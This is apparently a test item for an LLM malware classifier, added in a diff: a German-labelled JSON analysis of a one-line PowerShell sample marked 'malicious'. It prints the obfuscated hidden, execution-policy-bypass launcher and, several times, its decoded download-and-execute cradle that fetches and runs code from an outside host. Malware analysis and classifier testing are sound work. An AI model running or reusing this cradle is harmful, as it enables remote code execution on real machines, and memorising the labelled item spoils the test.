@@ -1,0 +1,71 @@
+{
+  "meta": {
+    "quelldatei": "0650ef83b3fa0ba158db8f846b2702a03b90ce85d691c2cbcade2b95e8d9271f.ps1",
+    "sha256": "0650ef83b3fa0ba158db8f846b2702a03b90ce85d691c2cbcade2b95e8d9271f",
+    "groesse_bytes": 251,
+    "zeilen": 1,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 208,
+        "dekodiert": "IEX (New-Object Net.Webclient).downloadstring(\"http://moendorf.top/index.php\")"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 208,
+        "dekodiert": "IEX (New-Object Net.Webclient).downloadstring(\"http://moendorf.top/index.php\")"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "encodedcommand": 1,
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 208,
+        "dekodiert": "IEX (New-Object Net.Webclient).downloadstring(\"http://moendorf.top/index.php\")"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "encodedcommand": 1,
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "powErshEll  -nop -w hiddEn -Ep bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBvAGUAbgBkAG8AcgBmAC4AdABvAHAALwBpAG4AZABlAHgALgBwAGgAcAAiACkA",
+    "dekodierte_befehle": [
+      "IEX (New-Object Net.Webclient).downloadstring(\"http://moendorf.top/index.php\")"
+    ],
+    "beobachtete_abfolge": [
+      "kodierten Befehl ausfuehren"
+    ]
+  }
+}
